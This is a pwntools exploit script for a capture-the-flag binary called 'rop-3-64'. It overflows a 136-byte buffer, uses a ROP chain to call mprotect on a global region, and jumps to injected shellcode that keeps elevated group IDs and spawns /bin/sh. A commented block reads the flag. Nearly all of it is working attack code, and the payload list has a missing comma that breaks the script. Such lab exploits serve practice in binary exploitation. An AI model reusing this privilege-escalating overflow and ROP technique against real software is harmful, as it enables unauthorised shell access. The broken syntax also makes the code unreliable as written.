from pwn import *
import os

DEBUG = False 
file = "./rop-3-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)

max_len = 136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
shellcode = asm('''
xor    rax,rax
xor    al,0x6c
syscall
mov    rdi,rax
mov    rsi,rax
xor    rax,rax
xor    al,0x72
syscall
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
xor    al,0x3b
movabs rbx,0x68732f6e69622f2f

xor    rdi,rdi
push   rdi
push   rbx
mov    rdi,rsp
syscall

''')


mprotect = p64(elf.symbols["mprotect"])
global_area =  p64(0x6bc000)
shellcode_addr = p64(elf.symbols["g_buf"])

pop_rdi = p64(0x00000000004006a6)
pop_rdx_rsi = p64(0x000000000044b669)

payload = flat (
    shellcode,
    (max_len - len(shellcode)) * b"A",
    pop_rdi,
    global_area
    pop_rdx_rsi,
    p64(7),
    p64(0x1000),
    mprotect,
    shellcode_addr
)

io.sendline(payload)

io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
